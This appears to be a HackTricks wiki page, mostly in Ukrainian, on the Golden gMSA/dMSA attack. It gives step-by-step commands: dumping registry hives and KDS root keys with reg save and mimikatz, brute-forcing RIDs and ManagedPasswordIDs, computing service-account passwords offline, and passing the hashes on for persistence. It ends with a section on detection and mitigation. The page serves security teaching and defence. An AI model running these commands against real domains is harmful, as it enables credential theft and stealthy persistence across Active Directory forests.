# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Windows Managed Service Accounts (MSA) — це спеціальні principals, призначені для запуску служб без необхідності вручну керувати їхніми паролями.
Існує два основні різновиди:

1. **gMSA** – group Managed Service Account – може використовуватися на кількох хостах, авторизованих в його атрибуті `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – наступник gMSA (preview), який використовує ту саму криптографію, але забезпечує більш granular сценарії delegation.

Для обох варіантів **пароль не зберігається** на кожному Domain Controller (DC), як звичайний NT-hash. Натомість кожен DC може **виводити** поточний пароль на льоту з:

* загальнолісового **KDS Root Key** (`KRBTGT\KDS`) – випадково згенерованого secret із назвою у форматі GUID, реплікованого на кожен DC у контейнері `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* **SID** цільового account.
* залежного від account **ManagedPasswordID** (GUID), знайденого в атрибуті `msDS-ManagedPasswordId`.

Derivation має такий вигляд: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240-байтовий blob, який зрештою **base64-encoded** і зберігається в атрибуті `msDS-ManagedPassword`.
Під час звичайного використання пароля не потрібні ані Kerberos traffic, ані взаємодія з domain – member host виводить пароль локально, якщо йому відомі ці три inputs.

## Golden gMSA / Golden dMSA Attack

Якщо attacker може отримати всі три inputs **offline**, він може обчислити **дійсні поточні та майбутні паролі** для **будь-якого gMSA/dMSA у forest**, більше не взаємодіючи з DC, обходячи:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* інтервали зміни пароля (їх можна обчислити заздалегідь)

Це аналог *Golden Ticket* для service accounts.<sup>[[1]](#references)[[2]](#references)</sup>

### Передумови

1. **Компрометація рівня forest** одного **DC** (або Enterprise Admin) чи доступ `SYSTEM` до одного з DC у forest.
2. Можливість перелічувати service accounts (LDAP read / RID brute-force).
3. Робоча станція з .NET ≥ 4.7.2 x64 для запуску [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) або еквівалентного code.

### Golden gMSA / dMSA
#### Phase 1 – Extract the KDS Root Key

Dump з будь-якого DC (Volume Shadow Copy / raw SAM+SECURITY hives або remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Рядок base64 з позначкою `RootKey` (назва GUID) потрібен на наступних етапах.<sup>[[1]](#references)[[2]](#references)</sup>

##### Фаза 2 – Перерахувати об’єкти gMSA / dMSA

Отримайте щонайменше `sAMAccountName`, `objectSid` і `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) реалізує допоміжні режими:<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Фаза 3 – Guess / Discover ManagedPasswordID (коли відсутній)

Деякі розгортання *видаляють* `msDS-ManagedPasswordId` під час читання, захищеного ACL.
Оскільки GUID має довжину 128 бітів, наївний bruteforce є нездійсненним, але:

1. Перші **32 біти = Unix epoch time** створення облікового запису (точність до хвилин).
2. Далі йдуть 96 випадкових бітів.

Тому вузький **wordlist** для кожного облікового запису (± кілька годин) є реалістичним.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Інструмент обчислює паролі-кандидати та порівнює їхній base64 blob зі справжнім атрибутом `msDS-ManagedPassword` – збіг розкриває правильний GUID.

##### Фаза 4 – Офлайн-обчислення та перетворення пароля

Щойно ManagedPasswordID відомий, дійсний пароль можна отримати однією командою:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Отримані хеші можна інжектити за допомогою **mimikatz** (`sekurlsa::pth`) або **Rubeus** для зловживання Kerberos, що забезпечує приховане **lateral movement** і **persistence**.

## Виявлення та пом'якшення

* Обмежте можливості **резервного копіювання DC і читання вуликів реєстру** адміністраторами Tier-0.
* Відстежуйте створення **Directory Services Restore Mode (DSRM)** або **Volume Shadow Copy** на DC.
* Аудитуйте читання / зміни `CN=Master Root Keys,…` і прапорців `userAccountControl` облікових записів служб.
* Виявляйте нетиповий запис паролів у **base64** або раптове повторне використання паролів служб на різних хостах.
* Розгляньте можливість перетворення gMSA з високими привілеями на **classic service accounts** із регулярною випадковою ротацією паролів там, де ізоляція Tier-0 неможлива.

## Інструменти

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – еталонна реалізація, використана на цій сторінці.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – еталонна реалізація, використана на цій сторінці.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket із використанням похідних AES-ключів.

## Посилання

- [1] [Golden dMSA – обхід автентифікації для делегованих Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [Атаки на облікові записи gMSA Active Directory](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Репозиторій Semperis/GoldenDMSA на GitHub](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
